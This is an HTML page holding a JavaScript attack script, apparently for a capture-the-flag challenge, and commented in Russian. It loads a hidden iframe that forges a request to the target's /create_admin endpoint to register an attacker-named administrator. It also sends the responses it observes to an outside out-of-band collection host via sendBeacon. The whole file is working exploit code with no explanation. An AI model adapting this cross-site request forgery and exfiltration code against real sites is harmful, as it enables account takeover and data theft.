<!DOCTYPE html>
<html>
<body>
<script>
const TARGET = "https://tasks.goidactf.ru:20385";
const OAST = "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun";
const ADMIN = "evil_admin";

const log = (d) => navigator.sendBeacon(OAST + "/leak?d=" + encodeURIComponent(d));

// Создаем iframe с srcdoc для лучшего контроля
const iframe = document.createElement('iframe');
iframe.name = 'attackFrame';
iframe.sandbox = 'allow-scripts allow-same-origin allow-forms';
iframe.style.display = 'none';

// srcdoc с нашей атакой
iframe.srcdoc = `
    <!DOCTYPE html>
    <html>
    <body>
    <div id="status">Loading...</div>
    
    <form id="loadForm" method="GET" action="${TARGET}/admin"></form>
    <form id="createForm" method="POST" action="${TARGET}/create_admin">
        <input type="hidden" name="new_admin_login" value="${ADMIN}">
    </form>
    
    <script>
        let step = 0;
        
        function sendResult() {
            const statusDiv = document.getElementById('status');
            const text = statusDiv ? statusDiv.textContent : 'no status div';
            
            // Отправляем результат родителю
            try {
                parent.postMessage({
                    type: 'status',
                    step: step,
                    content: text,
                    fullText: document.body.textContent.substring(0, 500)
                }, '*');
            } catch(e) {
                console.log('postMessage error:', e);
            }
            
            step++;
        }
        
        // Начальная загрузка
        document.getElementById('loadForm').submit();
        
        // Проверяем периодически
        setInterval(sendResult, 1000);
        
        // Через 2 секунды отправляем форму создания
        setTimeout(() => {
            document.getElementById('createForm').submit();
        }, 2000);
    <\\/script>
    </body>
    </html>
`;

// Обработчик сообщений от iframe
window.addEventListener('message', (event) => {
    if (event.data && event.data.type === 'status') {
        const data = event.data;
        log(`iframe_step_${data.step}: ${data.content.substring(0, 200)}`);
        
        // Анализируем содержимое
        if (data.content.includes('401') || data.content.includes('MOTHER FUCKER')) {
            log("DETECTED_401_RESPONSE");
        } else if (data.content.includes('Status:')) {
            const match = data.content.match(/Status:\s*(\d+)/);
            log(`DETECTED_STATUS_${match ? match[1] : 'unknown'}`);
        }
    }
});

document.body.appendChild(iframe);
log("attack_started");
</script>
</body>
</html>
